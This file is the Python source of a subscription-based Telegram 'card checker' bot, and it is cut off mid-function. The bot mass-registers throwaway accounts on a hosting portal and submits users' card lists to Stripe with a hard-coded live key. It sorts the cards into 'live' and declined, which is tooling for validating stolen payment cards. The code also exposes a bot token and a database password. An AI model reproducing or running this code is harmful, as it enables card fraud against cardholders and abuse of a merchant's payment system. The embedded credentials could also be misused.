import requests
import uuid
import telebot
import psycopg2
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==============================
# RANDOM EMAIL GENERATOR
def generate_email(domain="necub.com"):
    """Generate random email for each check session"""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{prefix}@{domain}"

# ==============================
# BIN LOOKUP FUNCTION
def get_card_info(card_number):
    """Get card BIN information"""
    try:
        bin_number = str(card_number)[:6]
        url = f"https://lookup.binlist.net/{bin_number}"
        
        headers = {
            "Accept-Version": "3"
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return {
                "BIN": bin_number,
                "Scheme": data.get("scheme", "Unknown"),
                "Type": data.get("type", "Unknown"),
                "Brand": data.get("brand", "Unknown"),
                "Country": data.get("country", {}).get("name", "Unknown"),
                "Bank": data.get("bank", {}).get("name", "Unknown")
            }
        else:
            return None
    except Exception as e:
        print(f"BIN lookup error: {e}")
        return None

# BOT TOKEN
TOKEN = "7707283677:AAF0rE6MKt-HBq8_MfyQ00V28y_l3Tnu-HM"
bot = telebot.TeleBot(TOKEN)

# DATABASE CONFIG
DATABASE_URL = "postgresql://postgres:QkafGfThmWUvSzvkXNvJToBBUVtPQQSV@postgres.railway.internal:5432/railway"

# ADMIN IDS (Add your admin IDs here)
ADMIN_IDS = [5895491379]  # Your ID

# CONTACT INFO
CONTACT_INFO = {
    'name': 'Mahmoud Saad 🥷🏻',
    'username': '@FastSpeedtest',
    'id': 5895491379
}

# TEMPORARY STATES
waiting_for_user_id = {}
waiting_for_admin_action = {}

# ==============================
# DATABASE FUNCTIONS
def get_db_connection():
    """Get database connection with error handling"""
    try:
        conn = psycopg2.connect(DATABASE_URL)
        return conn
    except Exception as e:
        print(f"Database connection error: {e}")
        return None

def init_db():
    """Initialize database tables"""
    conn = get_db_connection()
    if not conn:
        print("Failed to connect to database!")
        return False
        
    try:
        cur = conn.cursor()
        
        # Users table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username VARCHAR(255),
                first_name VARCHAR(255),
                subscription_end TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Admins table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS admins (
                user_id BIGINT PRIMARY KEY,
                username VARCHAR(255),
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Settings table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key VARCHAR(255) PRIMARY KEY,
                value VARCHAR(255)
            )
        ''')
        
        # Insert default settings
        cur.execute('''
            INSERT INTO settings (key, value) VALUES ('subscription_required', 'true')
            ON CONFLICT (key) DO NOTHING
        ''')
        
        # Insert default admin
        cur.execute('''
            INSERT INTO admins (user_id, username) VALUES (%s, %s)
            ON CONFLICT (user_id) DO NOTHING
        ''', (ADMIN_IDS[0], CONTACT_INFO['username']))
        
        conn.commit()
        cur.close()
        conn.close()
        print("Database initialized successfully!")
        return True
        
    except Exception as e:
        print(f"Database initialization error: {e}")
        conn.close()
        return False

def get_user_subscription(user_id):
    """Get user subscription info"""
    conn = get_db_connection()
    if not conn:
        return None
        
    try:
        cur = conn.cursor()
        cur.execute('SELECT subscription_end FROM users WHERE user_id = %s', (user_id,))
        result = cur.fetchone()
        cur.close()
        conn.close()
        return result[0] if result else None
    except Exception as e:
        print(f"Get subscription error: {e}")
        conn.close()
        return None

def add_user(user_id, username, first_name):
    """Add new user to database"""
    conn = get_db_connection()
    if not conn:
        return False
        
    try:
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO users (user_id, username, first_name)
            VALUES (%s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE SET
            username = EXCLUDED.username,
            first_name = EXCLUDED.first_name
        ''', (user_id, username, first_name))
        conn.commit()
        cur.close()
        conn.close()
        return True
    except Exception as e:
        print(f"Add user error: {e}")
        conn.close()
        return False

def update_subscription(user_id, hours=0, days=0):
    """Update user subscription"""
    conn = get_db_connection()
    if not conn:
        return False
        
    try:
        cur = conn.cursor()
        
        new_end = datetime.now() + timedelta(hours=hours, days=days)
        
        # First ensure user exists
        cur.execute('''
            INSERT INTO users (user_id, subscription_end) VALUES (%s, %s)
            ON CONFLICT (user_id) DO UPDATE SET subscription_end = EXCLUDED.subscription_end
        ''', (user_id, new_end))
        
        conn.commit()
        cur.close()
        conn.close()
        return True
    except Exception as e:
        print(f"Update subscription error: {e}")
        conn.close()
        return False

def is_admin(user_id):
    """Check if user is admin"""
    if user_id in ADMIN_IDS:  # Always check hardcoded admins first
        return True
        
    conn = get_db_connection()
    if not conn:
        return False
        
    try:
        cur = conn.cursor()
        cur.execute('SELECT user_id FROM admins WHERE user_id = %s', (user_id,))
        result = cur.fetchone()
        cur.close()
        conn.close()
        return result is not None
    except Exception as e:
        print(f"Check admin error: {e}")
        conn.close()
        return False

def add_admin(user_id, username):
    """Add new admin"""
    conn = get_db_connection()
    if not conn:
        return False
        
    try:
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO admins (user_id, username) VALUES (%s, %s)
            ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username
        ''', (user_id, username))
        conn.commit()
        cur.close()
        conn.close()
        return True
    except Exception as e:
        print(f"Add admin error: {e}")
        conn.close()
        return False

def remove_admin(user_id):
    """Remove admin"""
    if user_id in ADMIN_IDS:  # Can't remove hardcoded admins
        return False
        
    conn = get_db_connection()
    if not conn:
        return False
        
    try:
        cur = conn.cursor()
        cur.execute('DELETE FROM admins WHERE user_id = %s', (user_id,))
        conn.commit()
        cur.close()
        conn.close()
        return True
    except Exception as e:
        print(f"Remove admin error: {e}")
        conn.close()
        return False

def get_all_admins():
    """Get all admins"""
    conn = get_db_connection()
    if not conn:
        return []
        
    try:
        cur = conn.cursor()
        cur.execute('SELECT user_id, username FROM admins')
        result = cur.fetchall()
        cur.close()
        conn.close()
        return result
    except Exception as e:
        print(f"Get admins error: {e}")
        conn.close()
        return []

def get_all_users():
    """Get all users with subscription info"""
    conn = get_db_connection()
    if not conn:
        return []
        
    try:
        cur = conn.cursor()
        cur.execute('''
            SELECT user_id, username, first_name, subscription_end, created_at 
            FROM users 
            ORDER BY created_at DESC 
            LIMIT 50
        ''')
        result = cur.fetchall()
        cur.close()
        conn.close()
        return result
    except Exception as e:
        print(f"Get users error: {e}")
        conn.close()
        return []

def get_user_stats():
    """Get user statistics"""
    conn = get_db_connection()
    if not conn:
        return {"total": 0, "active_subs": 0, "expired_subs": 0}
        
    try:
        cur = conn.cursor()
        
        # Total users
        cur.execute('SELECT COUNT(*) FROM users')
        total = cur.fetchone()[0]
        
        # Active subscriptions
        cur.execute('SELECT COUNT(*) FROM users WHERE subscription_end > NOW()')
        active_subs = cur.fetchone()[0]
        
        # Expired subscriptions
        cur.execute('SELECT COUNT(*) FROM users WHERE subscription_end <= NOW()')
        expired_subs = cur.fetchone()[0]
        
        cur.close()
        conn.close()
        
        return {
            "total": total,
            "active_subs": active_subs,
            "expired_subs": expired_subs
        }
    except Exception as e:
        print(f"Get stats error: {e}")
        conn.close()
        return {"total": 0, "active_subs": 0, "expired_subs": 0}

def is_subscription_required():
    """Check if subscription is required"""
    conn = get_db_connection()
    if not conn:
        return True  # Default to requiring subscription
        
    try:
        cur = conn.cursor()
        cur.execute('SELECT value FROM settings WHERE key = %s', ('subscription_required',))
        result = cur.fetchone()
        cur.close()
        conn.close()
        return result[0] == 'true' if result else True
    except Exception as e:
        print(f"Check subscription setting error: {e}")
        conn.close()
        return True

def toggle_subscription_system():
    """Toggle subscription system on/off"""
    conn = get_db_connection()
    if not conn:
        return False
        
    try:
        cur = conn.cursor()
        
        current = is_subscription_required()
        new_value = 'false' if current else 'true'
        
        cur.execute('''
            UPDATE settings SET value = %s WHERE key = %s
        ''', (new_value, 'subscription_required'))
        conn.commit()
        cur.close()
        conn.close()
        return not current
    except Exception as e:
        print(f"Toggle subscription error: {e}")
        conn.close()
        return False

def register_account(email):
    """Register new account with generated email"""
    try:
        headers = {
            'sec-ch-ua-platform': '"Windows"',
            'Referer': 'https://portal.budgetvm.com/auth/login',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        
        data = {
            'reg_email': email,
            'reg_password': '111222333',
            'reg_password2': '111222333',
            'agree': 'on',
            'email': email,
            'password': '111222333',
            'password2': '111222333',
        }
        
        response = requests.post('https://portal.budgetvm.com/auth/Register', headers=headers, data=data)
        print(f"📩 Registered email: {email}")
        print(f"✅ Registration status: {response.status_code}")
        
        return response.status_code == 200
    except Exception as e:
        print(f"Registration error: {e}")
        return False

# ==============================
# Stripe headers
stripe_headers = {
    "accept": "application/json",
    "accept-language": "en-US",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
}

# BudgetVM headers
budget_headers = {
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://portal.budgetvm.com",
    "Referer": "https://portal.budgetvm.com/MyAccount/MyBilling",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
}

# ==============================
# DATA STORAGE
user_cards, stats, messages, stop_flag = {}, {}, {}, {}

# ==============================
# SUBSCRIPTION CHECKER
def check_subscription(user_id):
    """Check if user has active subscription"""
    if not is_subscription_required():
        return True
        
    if is_admin(user_id):
        return True
        
    sub_end = get_user_subscription(user_id)
    if sub_end and sub_end > datetime.now():
        return True
    return False

# ==============================
# HELPER FUNCTION TO ESCAPE MARKDOWNV2
def escape_markdown_v2(text):
    """Escape special characters for Telegram MarkdownV2"""
    if text is None:
        return "Unknown"
    
    text = str(text)
    # Characters that need escaping in Telegram MarkdownV2
    # This list is comprehensive for general text outside of code blocks
    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    
    escaped_text = ""
    for char in text:
        if char in escape_chars:
            escaped_text += f'\\{char}'
        else:
            escaped_text += char
    
    return escaped_text

# ==============================
# DASHBOARD FUNCTIONS
def generate_dashboard(chat_id):
    s = stats.get(chat_id)
    if not s:
        return "⚠️ No data available."

    msg = "📊 \\*\\*CARD CHECKER RESULTS\\*\\*\n\n" # Escaped for MarkdownV2
    if s.get('visa_checked'):
        # For text inside backticks, Telegram treats it literally.
        # So, no need to call escape_markdown_v2 here for card numbers.
        card_display = str(s['visa_checked'])
        msg += f"💳 \\*\\*Current:\\*\\* `{card_display}`\n"
        msg += f"📌 \\*\\*Status:\\*\\* {escape_markdown_v2(s.get('response', 'Processing...'))}\n\n"
    else:
        msg += f"📌 \\*\\*Status:\\*\\* {escape_markdown_v2(s.get('response', 'Starting...'))}\n\n"

    msg += "━━━━━━━━━━━━━━━━━━━\n\n"
    
    if s.get("lives"):
        msg += "💳 \\*\\*Live Cards:\\*\\*\n"
        for card in s["lives"]:
            try:
                card_number = card.split("|")[0]
                card_info = get_card_info(card_number)
                
                # Same logic for live cards: if wrapped in backticks, no need for full markdown escape
                escaped_card = str(card)
                msg += f"`{escaped_card}`\n"
                
                if card_info:
                    msg += f"🏦 \\*\\*Bank:\\*\\* {escape_markdown_v2(card_info['Bank'])}\n"
                    msg += f"🌍 \\*\\*Country:\\*\\* {escape_markdown_v2(card_info['Country'])}\n"
                    msg += f"💎 \\*\\*Type:\\*\\* {escape_markdown_v2(card_info['Scheme'])} {escape_markdown_v2(card_info['Type'])}\n"
                    msg += f"🏷️ \\*\\*Brand:\\*\\* {escape_markdown_v2(card_info['Brand'])}\n\n"
                else:
                    msg += "\n"
            except Exception as e:
                print(f"Card info error: {e}")
                escaped_card = str(card)
                msg += f"`{escaped_card}`\n\n"
    
    return msg

def generate_buttons(chat_id):
    s = stats.get(chat_id, {"approved":0,"declined":0,"cvv":0,"ccn":0,"total":0})
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"✅ Approved: {s['approved']}", callback_data="show_approved"),
        InlineKeyboardButton(f"❌ Declined: {s['declined']}", callback_data="show_declined"),
    )
    markup.add(
        InlineKeyboardButton(f"⚠️ CVV Error: {s['cvv']}", callback_data="show_cvv"),
        InlineKeyboardButton(f"⛔ Blocked: {s['ccn']}", callback_data="show_ccn"),
    )
    markup.add(
        InlineKeyboardButton(f"📊 Total: {s['total']}", callback_data="show_total")
    )
    markup.add(
        InlineKeyboardButton("ℹ️ Stop Check", callback_data="stop_check")
    )
    return markup

def generate_admin_panel():
    """Generate admin panel buttons"""
    markup = InlineKeyboardMarkup(row_width=2)
    
    sub_status = "ON" if is_subscription_required() else "OFF"
    markup.add(
        InlineKeyboardButton(f"🔄 Subscription: {sub_status}", callback_data="toggle_subscription")
    )
    markup.add(
        InlineKeyboardButton("👑 Manage Admins", callback_data="manage_admins"),
        InlineKeyboardButton("💎 Add Subscription", callback_data="add_subscription")
    )
    markup.add(
        InlineKeyboardButton("📊 Statistics", callback_data="show_stats"),
        InlineKeyboardButton("👥 All Users", callback_data="show_users")
    )
    return markup

def generate_admin_list():
    """Generate admin management panel"""
    markup = InlineKeyboardMarkup(row_width=1)
    
    admins = get_all_admins()
    if admins:
        markup.add(InlineKeyboardButton("📋 Current Admins:", callback_data="none"))
        for admin_id, username in admins:
            admin_text = f"👑 {username or 'No username'} ({admin_id})"
            if admin_id in ADMIN_IDS:
                admin_text += " [MAIN]"
            markup.add(InlineKeyboardButton(admin_text, callback_data=f"admin_info_{admin_id}"))
    
    markup.add(
        InlineKeyboardButton("➕ Add Admin", callback_data="add_admin"),
        InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")
    )
    markup.add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    return markup

def generate_subscription_panel():
    """Generate subscription management panel"""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⏰ 1 Hour", callback_data="sub_1h"),
        InlineKeyboardButton("⏰ 3 Hours", callback_data="sub_3h")
    )
    markup.add(
        InlineKeyboardButton("⏰ 6 Hours", callback_data="sub_6h"),
        InlineKeyboardButton("⏰ 12 Hours", callback_data="sub_12h")
    )
    markup.add(
        InlineKeyboardButton("📅 1 Day", callback_data="sub_1d"),
        InlineKeyboardButton("📅 3 Days", callback_data="sub_3d")
    )
    markup.add(
        InlineKeyboardButton("📅 7 Days", callback_data="sub_7d"),
        InlineKeyboardButton("📅 30 Days", callback_data="sub_30d")
    )
    markup.add(
        InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
    )
    return markup

# ==============================
# CARD CHECKING FUNCTION
def run_check(chat_id):
    cards = user_cards.get(chat_id, [])
    s = {"visa_checked":"","approved":0,"declined":0,"unknown":0,"total":0,"response":"",
         "lives":[],"cvv":0,"ccn":0}
    stop_flag[chat_id] = False
    stats[chat_id] = s

    session = requests.Session()

    # Generate random email for this check session
    email = generate_email()
    print(f"🎯 Starting check session with email: {email}")
    
    # Register new account
    if not register_account(email):
        s["response"] = "❌ Account registration failed"
        stats[chat_id] = s
        # Update message after failure
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=messages[chat_id],
                text=generate_dashboard(chat_id),
                parse_mode="MarkdownV2",
                reply_markup=generate_buttons(chat_id)
            )
        except Exception as e:
            print("Edit error on registration failure:", e)
        return

    # Login with generated email
    login_data = {"email": email, "password": "111222333"}
    login_response = session.post("https://portal.budgetvm.com/auth/login", data=login_data)
    
    if login_response.status_code != 200:
        s["response"] = "❌ Login failed"
        stats[chat_id] = s
        # Update message after failure
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=messages[chat_id],
                text=generate_dashboard(chat_id),
                parse_mode="MarkdownV2",
                reply_markup=generate_buttons(chat_id)
            )
        except Exception as e:
            print("Edit error on login failure:", e)
        return

    print(f"✅ Successfully logged in with: {email}")
    
    # GoogleAsk
    google_data = {
        "gEmail": email,
        "gUniqueask": "client",
        "setup": "2",
        "email": email,
        "gUnique": "client"
    }
    session.post("https://portal.budgetvm.com/auth/googleAsk", data=google_data)

    if "ePortalv1" not in session.cookies.get_dict():
        s["response"] = "❌ Login/GoogleAsk failed"
        stats[chat_id] = s
        # Update message after failure
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=messages[chat_id],
                text=generate_dashboard(chat_id),
                parse_mode="MarkdownV2",
                reply_markup=generate_buttons(chat_id)
            )
        except Exception as e:
            print("Edit error on GoogleAsk failure:", e)
        return

    print(f"✅ Successfully logged in with: {email}")
    
    # Check cards with delay
    for i, card in enumerate(cards):
        if stop_flag.get(chat_id):
            s["response"] = "ℹ️ Check stopped"
            stats[chat_id] = s
            # Final update after stop
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=messages[chat_id],
                    text=generate_dashboard(chat_id),
                    parse_mode="MarkdownV2",
                    reply_markup=generate_buttons(chat_id)
                )
            except Exception as e:
                print("Edit error on stop:", e)
            break

        s["total"] += 1
        s["visa_checked"] = card

        try:
            card_number, exp_month, exp_year, cvc = card.split("|")
        except ValueError: # Catch specific error for invalid format
            s["cvv"] += 1
            s["response"] = "❌ Invalid card format"
            stats[chat_id] = s
            # Update message after each card
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=messages[chat_id],
                    text=generate_dashboard(chat_id),
                    parse_mode="MarkdownV2", # Changed to MarkdownV2
                    reply_markup=generate_buttons(chat_id)
                )
            except Exception as e:
                print("Edit error (invalid card format):", e)
            continue

        # Add 15 second delay between card requests (except for first card)
        if i > 0:
            print(f"⏳ Waiting 15 seconds before next card...")
            for countdown in range(15, 0, -1):
                if stop_flag.get(chat_id):
                    s["response"] = "ℹ️ Check stopped"
                    stats[chat_id] = s
                    # Final update after stop during delay
                    try:
                        bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=messages[chat_id],
                            text=generate_dashboard(chat_id),
                            parse_mode="MarkdownV2",
                            reply_markup=generate_buttons(chat_id)
                        )
                    except Exception as e:
                        print("Edit error on stop during delay:", e)
                    return
                time.sleep(1)

        print(f"💥 Checking card {i+1}/{len(cards)}: {card_number[:4]}****{card_number[-4:]}")

        # Stripe Token
        muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
        stripe_data = (
            f"time_on_page=10000&guid={guid}&muid={muid}&sid={sid}"
            f"&key=pk_live_7sv0O1D5LasgJtbYpxp9aUbX&payment_user_agent=stripe.js"
            f"&card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}"
        )

        stripe_response = session.post("https://api.stripe.com/v1/tokens", headers=stripe_headers, data=stripe_data)
        resp_json = stripe_response.json()

        if "id" not in resp_json:
            s["cvv"] += 1
            s["response"] = "❌ Token creation failed"
        else:
            token_id = resp_json["id"]
            card_response = session.post(
                "https://portal.budgetvm.com/MyGateway/Stripe/cardAdd",
                headers=budget_headers,
                cookies=session.cookies.get_dict(),
                data={"stripeToken": token_id}
            )
            try:
                resp_json = card_response.json()
            except:
                s["unknown"] += 1
                s["response"] = "❓ Unknown response"
                stats[chat_id] = s
                # Update message after each card
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=messages[chat_id],
                        text=generate_dashboard(chat_id),
                        parse_mode="MarkdownV2", # Changed to MarkdownV2
                        reply_markup=generate_buttons(chat_id)
                    )
                except Exception as e:
                    print("Edit error (unknown response):", e)
                continue

            result = str(resp_json.get("result",""))
            if resp_json.get("success") is True:
                s["approved"] += 1
                s["response"] = f"✅ {result}"
                s["lives"].append(card)
            elif "does not support" in result.lower() or "blocked" in result.lower():
                s["ccn"] += 1
                s["response"] = f"⛔ {result}"
            elif "declined" in result.lower():
                s["declined"] += 1
                s["response"] = f"❌ {result}"
            else:
                s["unknown"] += 1
                s["response"] = f"❓ {result}"

        stats[chat_id] = s

        # Update message after each card
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=messages[chat_id],
                text=generate_dashboard(chat_id),
                parse_mode="MarkdownV2", # Changed to MarkdownV2
                reply_markup=generate_buttons(chat_id)
            )
        except Exception as e:
            print("Edit error (per card update):", e)
    
    # Final update after loop finishes
    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=messages[chat_id],
            text=generate_dashboard(chat_id),
            parse_mode="MarkdownV2",
            reply_markup=generate_buttons(chat_id)
        )
    except Exception as e:
        print("Edit error (final update):", e)


# ==============================
# BOT COMMANDS
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    # Add user to database
    add_user(user_id, username, first_name)
    
    if not check_subscription(user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
        
        bot.send_message(
            message.chat.id, 
            f"🚫 \\*\\*Access Denied\\*\\*\n\n" # Escaped for MarkdownV2
            f"❌ You don't have an active subscription\\!\n\n" # Escaped for MarkdownV2
            f"👤 \\*\\*Your ID:\\*\\* `{user_id}`\n" # Escaped for MarkdownV2
            f"👑 \\*\\*Contact Admin:\\*\\* {escape_markdown_v2(CONTACT_INFO['name'])}\n" # Escaped for MarkdownV2
            f"📱 \\*\\*Username:\\*\\* {escape_markdown_v2(CONTACT_INFO['username'])}\n" # Escaped for MarkdownV2
            f"🆔 \\*\\*Admin ID:\\*\\* `{CONTACT_INFO['id']}`\n\n" # Escaped for MarkdownV2
            f"📞 Click the button below to contact admin for subscription\\!", # Escaped for MarkdownV2
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=markup
        )
        return
    
    if is_admin(user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel"))
        bot.send_message(
            message.chat.id, 
            "👋 \\*\\*Welcome Admin\\!\\*\\*\n\n" # Escaped for MarkdownV2
            "🚀 \\*\\*Card Checker Bot\\*\\*\n" # Escaped for MarkdownV2
            "💳 Use /check to start checking cards\n"
            "👑 Use Admin Panel for management\n\n"
            "📋 \\*\\*Commands:\\*\\*\n" # Escaped for MarkdownV2
            "• `/check` \\- Start card checking\n" # Escaped for MarkdownV2
            "• `/admin` \\- Admin panel", # Escaped for MarkdownV2
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=markup
        )
    else:
        sub_end = get_user_subscription(user_id)
        sub_text = f"📅 \\*\\*Expires:\\*\\* {sub_end.strftime('%Y-%m-%d %H:%M UTC')}" if sub_end else "♾️ \\*\\*Unlimited\\*\\*" # Escaped for MarkdownV2
        
        bot.send_message(
            message.chat.id, 
            f"👋 \\*\\*Welcome\\!\\*\\*\n\n" # Escaped for MarkdownV2
            f"🚀 \\*\\*Card Checker Bot\\*\\*\n" # Escaped for MarkdownV2
            f"✅ \\*\\*Subscription Status:\\*\\* Active\n" # Escaped for MarkdownV2
            f"{sub_text}\n\n"
            f"📋 \\*\\*Commands:\\*\\*\n" # Escaped for MarkdownV2
            f"• `/check` \\- Start card checking\n\n" # Escaped for MarkdownV2
            f"💳 Ready to check your cards\\!", # Escaped for MarkdownV2
            parse_mode="MarkdownV2" # Changed to MarkdownV2
        )

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "🚫 Access denied\\! Admin only\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        return
    
    stats = get_user_stats()
    sub_status = "ON" if is_subscription_required() else "OFF"
    
    bot.send_message(
        message.chat.id,
        f"👑 \\*\\*Admin Panel\\*\\*\n\n" # Escaped for MarkdownV2
        f"📊 \\*\\*System Status:\\*\\*\n" # Escaped for MarkdownV2
        f"• Subscription System: \\*\\*{sub_status}\\*\\*\n" # Escaped for MarkdownV2
        f"• Total Users: \\*\\*{stats['total']}\\*\\*\n" # Escaped for MarkdownV2
        f"• Active Subscriptions: \\*\\*{stats['active_subs']}\\*\\*\n" # Escaped for MarkdownV2
        f"• Expired Subscriptions: \\*\\*{stats['expired_subs']}\\*\\*\n\n" # Escaped for MarkdownV2
        f"🔧 \\*\\*Management Options:\\*\\*", # Escaped for MarkdownV2
        parse_mode="MarkdownV2", # Changed to MarkdownV2
        reply_markup=generate_admin_panel()
    )

@bot.message_handler(commands=['check'])
def ask_for_cards(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
        
        bot.send_message(
            message.chat.id, 
            f"🚫 \\*\\*Subscription Required\\*\\*\n\n" # Escaped for MarkdownV2
            f"❌ You need an active subscription to use this service\\!\n\n" # Escaped for MarkdownV2
            f"👤 \\*\\*Your ID:\\*\\* `{user_id}`\n" # Escaped for MarkdownV2
            f"📞 Contact admin for subscription:",
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=markup
        )
        return
    
    bot.send_message(
        message.chat.id, 
        "💳 \\*\\*Send your cards now\\!\\*\\*\n\n" # Escaped for MarkdownV2
        "📋 \\*\\*Format:\\*\\* `4111111111111111|12|2025|123`\n\n" # Escaped for MarkdownV2
        "📄 \\*\\*Options:\\*\\*\n" # Escaped for MarkdownV2
        "• Send as text \\(one per line\\)\n" # Escaped for MarkdownV2
        "• Upload \\.txt file\n\n" # Escaped for MarkdownV2
        "⚡ Ready to check your cards\\!", # Escaped for MarkdownV2
        parse_mode="MarkdownV2" # Changed to MarkdownV2
    )

# File handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        bot.reply_to(message, "🚫 Subscription required\\!", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        return
        
    if not message.document.file_name.endswith(".txt"):
        bot.reply_to(message, "⚠️ Please send a \\.txt file only\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        return
        
    file_info = bot.get_file(message.document.file_id)
    file_content = bot.download_file(file_info.file_path).decode("utf-8")
    cards = [line.strip() for line in file_content.splitlines() if "|" in line]
    
    if not cards:
        bot.reply_to(message, "❌ No valid cards found in file\\!", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        return
    
    user_cards[message.chat.id] = cards
    s = {"approved":0,"declined":0,"unknown":0,"total":0,"response":"🔥 Starting check...","lives":[],"cvv":0,"ccn":0,"visa_checked":""}
    stats[message.chat.id] = s
    
    msg = bot.send_message(
        message.chat.id, 
        generate_dashboard(message.chat.id), 
        parse_mode="MarkdownV2", # Changed to MarkdownV2
        reply_markup=generate_buttons(message.chat.id)
    )
    messages[message.chat.id] = msg.message_id
    
    # Start checking in thread
    threading.Thread(target=run_check, args=(message.chat.id,)).start()

# Text handler
@bot.message_handler(func=lambda m: "|" in m.text)
def handle_cards_text(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        bot.reply_to(message, "🚫 Subscription required\\!", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        return
        
    cards = [line.strip() for line in message.text.splitlines() if "|" in line]
    
    if not cards:
        bot.reply_to(message, "❌ No valid cards found\\!", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        return
        
    user_cards[message.chat.id] = cards
    s = {"approved":0,"declined":0,"unknown":0,"total":0,"response":"🔥 Starting check...","lives":[],"cvv":0,"ccn":0,"visa_checked":""}
    stats[message.chat.id] = s
    
    msg = bot.send_message(
        message.chat.id, 
        generate_dashboard(message.chat.id), 
        parse_mode="MarkdownV2", # Changed to MarkdownV2
        reply_markup=generate_buttons(message.chat.id)
    )
    messages[message.chat.id] = msg.message_id
    
    # Start checking in thread
    threading.Thread(target=run_check, args=(message.chat.id,)).start()

# Handle waiting for user ID or admin actions
@bot.message_handler(func=lambda m: True)
def handle_waiting_states(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        return
    
    # Handle waiting for user ID for subscription
    if user_id in waiting_for_user_id:
        try:
            target_user_id = int(message.text.strip())
            duration_data = waiting_for_user_id[user_id]
            
            # Add subscription
            if duration_data['type'] == 'hours':
                success = update_subscription(target_user_id, hours=duration_data['amount'])
            else:
                success = update_subscription(target_user_id, days=duration_data['amount'])
            
            if success:
                bot.send_message(
                    message.chat.id, 
                    f"✅ Successfully added {duration_data['amount']} {duration_data['type']} subscription to user `{target_user_id}`",
                    parse_mode="MarkdownV2" # Changed to MarkdownV2
                )
            else:
                bot.send_message(message.chat.id, "❌ Failed to add subscription\\. Database error\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
            
            del waiting_for_user_id[user_id]
            
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid user ID\\. Please send a valid number\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
    
    # Handle waiting for admin actions
    elif user_id in waiting_for_admin_action:
        action = waiting_for_admin_action[user_id]
        
        if action == 'add_admin':
            try:
                # Try to extract user ID from forwarded message or direct text
                if message.forward_from:
                    target_user_id = message.forward_from.id
